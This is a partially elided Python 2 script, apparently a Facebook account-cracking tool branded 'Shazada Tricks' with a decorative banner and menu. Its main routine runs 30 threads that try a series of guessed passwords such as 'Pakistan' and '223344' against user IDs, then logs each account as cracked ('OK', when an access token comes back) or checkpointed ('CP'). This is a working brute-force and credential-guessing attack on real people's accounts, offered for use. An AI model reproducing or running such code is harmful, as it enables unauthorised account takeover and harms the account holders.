...
try:
    ...
    os.system('python2 Host-Shazada.py')
...
\033[1;91m--------------------------------------------------
\033[1;93m          |----------------------------|
\033[1;93m          |        W E L L C O M       |
\033[1;93m          |----------------------------|
\033[1;91m--------------------------------------------------
\033[1;91m--------------------------------------------------
\033[1;94m>>>>>>>---- WELCOME TO ALL BAHAI LOG-----<<<<<<<<<
\033[1;91m--------------------------------------------------
\033[1;94m<<<<<-->>> BE HAPPY AND ENJOY ALWAYS <<<<->>>>
\033[1;91m--------------------------------------------------
\033[1;93m          |----------------------------|
\033[1;93m          |         Shazada Tricks         |
\033[1;93m          |----------------------------|
\033[1;91m-----------------------------------------------
\033[1;93mâ•°â•¼â•¼âž£ : Page       : Mustafa Writes
\033[1;92mâ•°â•¼â•¼âž£ : Author     : Shazada Tricker
\033[1;94mâ•°â•¼â•¼âž£ : Programmer : Ahsan Syed
\033[1;91m-----------------------------------------------
\033[1;93m<<<<-->>>> THIS TOOL IS FREE NOT FOR SALE <<<->>>>
\033[1;91m--------------------------------------------------
\033[1;91m--------------------------------------------------
\033[1;94m<<<<------->>>> Enjoy your time <<<------->>>>
\033[1;91m--------------------------------------------------
\033[1;91m--------------------------------------------------
                                '''
back=0
...
def menu():
	...
	print (S + '' + P + 'â•°â”€â•¼â•¼âž£ : [{2}] :' + S + '' + S + 'UPDATE THE  TOOL....')
...
def mb():
	...
	if bm =='':
	    ...
	    psb('Facebook Rahul Mishra')
	    psb('WellCome To Shazada')
	    psb('Congratulations Shazada Tool Has Been Updated Successfully')
	    psb('ðŸ”“User Nameâ˜† Shazadaâœ“')
	    psb('ðŸ”“Password â˜† Trickerâœ“')
...
def pb():
	...
	def main(arg):
		...
		try:
			...
			if 'www.facebook.com' in k['error_msg']:
			    print(S+'[{Shazada-Tricker-CP}] '+user+' '+ps1)
			    cps.append(user+ps1)
			else:
			    if 'access_token' in k:
			        print (G+'[{Shazada-Tricker-OK}] '+user+' '+ps1)
			        oks.append(user+ps1)
			    else:
			        ...
			        k=json.load(dt)
			        if 'www.facebook.com' in k['error_msg']:
			            print(S+'[{Shazada-Tricker-CP}] '+user+' '+ps2)
			            cps.append(user+ps2)
			        else:
			            if 'access_token' in k:
			                print(G+'[{Shazada-tricker-OK}]  '+user+' '+ps2)
			                oks.append(user+ps2)
			            else:
			                ...
			                k=json.load(dt)
			                if 'www.facebook.com' in k['error_msg']:
			                    print(S+'[{Shazada-tricker-CP}] '+user+' '+ps3)
			                    cps.append(user+ps3)
			                else:
			                    if 'access_token' in k:
			                        print(G+'[{Shazada-Tricker-OK}] '+user+' '+ps3)
			                        oks.append(user+ps3)
			                    else:
			                        ...
			                        k=json.load(dt)
			                        if 'www.facebook.com' in k['error_msg']:
			                            print(S+'[{Shazada-tricker-CP}] '+user+' '+ps4)
			                            cps.append(user+ps4)
			                        else:
			                            if 'access_token' in k:
			                                print(G+'[{Shazada-tricker-OK}] '+user+' '+ps4)
			                                oks.append(user+ps4)
			                            else:
			                                ps5=('Pakistan')
			                                ...
			                                k=json.load(dt)
			                                if 'www.facebook.com' in k['error_msg']:
			                                    print(S+'[{Ahsan-CP}] '+user+' '+ps5)
			                                    cps.append(user+ps5)
			                                else:
			                                    if 'access_token' in k:
			                                        print(G+'[{Ahsan--OK}] '+user+' '+ps5)
			                                        oks.append(user+ps5)
			                                    else:
			                                        ps6=('223344')
			                                        ...
			                                        k=json.load(dt)
			                                        if 'www.facebook.com' in k['error_msg']:
			                                            print(S+'[{Ahsan--CP}] '+user+' '+ps6)
			                                            cps.append(user+ps6)
			                                        else:
			                                            if 'access_token' in k:
			                                                print(G+'[{Shazada-Tricker-OK}] '+user+' '+ps6)
			                                                oks.append(user+ps6)
		except:
			pass
	p=ThreadPool(30)
	...
	print
	raw_input(R + 'Back')
	os.system('python2 Ahsan-Syed.py')
